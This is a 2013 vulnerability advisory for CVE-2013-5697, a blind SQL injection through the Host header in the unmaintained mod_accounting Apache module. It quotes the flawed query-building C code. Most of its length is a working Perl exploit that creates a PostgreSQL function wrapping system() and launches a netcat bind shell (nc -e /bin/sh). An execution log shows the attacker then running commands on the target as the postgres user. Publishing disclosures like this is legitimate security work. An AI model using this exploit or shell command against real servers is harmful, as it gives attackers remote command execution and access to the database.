@@ -1,0 +1,193 @@
+   - Affected Vendor: http://sourceforge.net/projects/mod-acct/files/
+   - Affected Software: mod_accounting
+   - Affected Version: 0.5. Other earlier versions may be affected.
+   - Issue type: Blind SQL injection
+   - Release Date: 20 Sep 2013
+   - Discovered by: Eldar "Wireghoul" Marcussen
+   - CVE Identifier: CVE-2013-5697
+   - Issue status: Abandoned software, no patch available
+
+Summary
+
+mod_accounting is a traffic accounting module for Apache 1.3.x which
+records traffic numbers in a database. Both MySQL and PostgreSQL database
+types are supported. It supports arbitrary database designs as traffic
+recording is performed via a user defined query in the Apache configuration
+using placeholders for received values. The following is an example
+configuration:
+
+<VirtualHost _default_:*>
+DocumentRoot "/var/www/"
+Options Indexes
+AccountingQueryFmt "INSERT INTO accounting VALUES( current_time, %r, %s,
+'%u', '%h' );"
+AccountingDatabase accounting
+AccountingDatabaseDriver postgres
+AccountingDBHost localhost 5432
+AccountingLoginInfo acct acct
+</VirtualHost>
+
+As user supplied values are not sanitised before being used in the
+placeholder values it is possible for an attacker to supply malicous values
+to perform blind SQL injection.
+
+
+Description
+
+The SQL injection occurs due to a user supplied HTTP header being used in
+the query without sanitisation. The module uses a simple string
+concatination approach to modify the placeholders in the user defined query
+before sending it to the database. This code can be located in
+mod_accounting.c:
+
+409: // build the query string from the template
+410: while( ptr ) {
+411:     char *next;
+412:
+413:     next = strchr( ptr, '%' );
+414:
+415:     if( next ) {
+416:         char       tmp[ 2 ];
+417:
+418:         *next++ = '\0';
+419:
+420:         switch( *next++ ) {
+421:
+422:             case 'h':
+423:                 query = ap_pstrcat( p, query, ptr, cfg->ServerName ?
+cfg->ServerName : "-", NULL );
+424:                 break;
+425:
+426:             case 's':
+427:                 query = ap_pstrcat( p, query, ptr, sent, NULL );
+428:                 break;
+429:
+430:             case 'r':
+431:                 query = ap_pstrcat( p, query, ptr, recvd, NULL );
+432:                 break;
+433:
+434:             case 'u':
+435:                 query = ap_pstrcat( p, query, ptr, get_user( r ), NULL
+);
+436:                 break;
+437:
+438:             default:
+439:                 tmp[0] = next[ -1 ];
+440:                 tmp[1] = '\0';
+441:
+442:                 query = ap_pstrcat( p, query, ptr, tmp, NULL );
+443:                 break;
+444:         }
+445:
+446:         next[ -2 ] = '%';
+447:
+448:     } else
+449:         query = ap_pstrcat( p, query, ptr, NULL );
+450:
+451:     ptr = next;
+452: }
+453:
+454: ( *DBDrivers[ cfg->DBDriver ].Query )( cfg, server, p, query );
+455:
+456: cfg->Received = cfg->Sent = 0;
+
+It is important to note that the database query takes place after the page
+has been served, hence there is no easy way to determine if a particular
+injection method was successful apart from using an out of band approach.
+However, as the injection occurs in an insert statement it is likely that
+the successful injection vector is one of about a handful of likely
+candidates.
+
+
+Impact
+
+An attacker is only limited by the capabilities of the database
+configuration and may be able to read, add, alter or delete data from your
+database(s), read or write arbitrary files or even execute commands on the
+server given a privileged database account.
+
+
+Proof of Concept
+
+root@bt:~/sploit-dev# cat mod_accounting-rce.pl
+#!/usr/bin/perl
+# PoC of blind SQL injection in the mod_accounting/0.5 Apache module
+# Injection can occur via the Host header
+# As the injection occurs in a user defined insert statement a bit of trial
+and error is required
+# Database operations occurs asyncronous to page response so timing attacks
+wont work
+# This one is completely blind
+# DB can be mysql or postgres, this PoC only covers postgres
+# PoC executes netcat to listen on port 4444 (requires dba privileges)
+use IO::Socket::INET;
+
+print "#----------------------------------------------#\n";
+print "| mod_accounting/0.5 PoC exploit by \@Wireghoul |\n";
+print "|          www.justanotherhacker.com           |\n";
+print "#----------Command execution via SQLi----------#\n";
+print "[*] Enumerating blind injection vectors:\n";
+
+my @endings = ("'));", '"));', "));", "');", '");', ");", "';", '";',";");
+# These should terminate most insert statements
+#my @endings = ( "');" );
+my $shell = 'nc -lnp 4444 -e /bin/sh';
+my $cnt = 0;
+my $content = "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS
+'/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT; SELECT system('$shell');";
+foreach $end (@endings) {
+  $cnt++;
+  my $sock = IO::Socket::INET->new("$ARGV[0]:$ARGV[1]") or die "Unable to
+connect to $ARGV[0]:$ARGV[1]: $!\n";
+  my $str = "GET / HTTP/1.1\r\nHost: $ARGV[0]$cnt$end $content --
+\r\n\r\n"; # from mysql.user into outfile '/tmp/pocpoc$cnt.txt'; --
+\r\n\r\n";
+  print "[-] Trying $end\n";
+  print $sock $str;
+  #print "Sent $end\n";
+  close ($sock);
+}
+print "[*] Done, remote server should have executed $shell\n";
+
+
+Execution of PoC:
+--------------------------------------------------
+root@bt:~/sploit-dev# nc 192.168.58.138 4444
+(UNKNOWN) [192.168.58.138] 4444 (?) : Connection refused
+root@bt:~/sploit-dev# perl mod_accounting-rce.pl 192.168.58.138 80
+#----------------------------------------------#
+| mod_accounting/0.5 PoC exploit by @Wireghoul |
+|          www.justanotherhacker.com           |
+#----------Command execution via SQLi----------#
+[*] Enumerating blind injection vectors:
+[-] Trying '));
+[-] Trying "));
+[-] Trying ));
+[-] Trying ');
+[-] Trying ");
+[-] Trying );
+[-] Trying ';
+[-] Trying ";
+[-] Trying ;
+[*] Done, remote server should have executed nc -lnp 4444 -e /bin/sh
+root@bt:~/sploit-dev# nc 192.168.58.138 4444
+pwd
+/var/lib/postgres/data/base/17142
+id
+uid=101(postgres) gid=104(postgres) groups=104(postgres)
+hostname
+sarge
+^C
+
+Solution
+
+As the module is no longer supported, discontinue the use of this module.
+
+
+Response Timeline
+
+   - 03/09/2013 - Vendor notified
+   - 03/09/2013 - Vendor acknowledge vulnerability
+   - 04/09/2013 - Project download removed and website updated to reflect
+   new status
+   - 20/09/2013 - Advisory released
